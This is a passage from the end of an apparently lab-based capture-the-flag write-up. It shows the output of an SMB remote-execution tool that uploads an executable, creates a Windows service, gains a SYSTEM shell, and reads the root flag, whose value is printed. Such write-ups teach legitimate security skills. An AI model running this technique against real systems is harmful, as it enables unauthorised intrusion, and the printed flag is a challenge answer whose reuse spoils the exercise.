[*] Uploading file vMwmGhAZ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service eTyL on 10.10.10.100.....
[*] Starting service eTyL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/01/2021  07:49 ��    <DIR>          .

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/01/2021  07:49 ��    <DIR>          ..

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
16/07/2025  03:52 ��                34 root.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.140.748.288 bytes free

C:\Users\Administrator\Desktop> type root.txt
57f24f5900db27e9139e64977342e842

```

**Root Flag: `57f24f5900db27e9139e64977342e842`**

Thank you for your time.

# Mission complete

![alt text](../assets/Done.gif)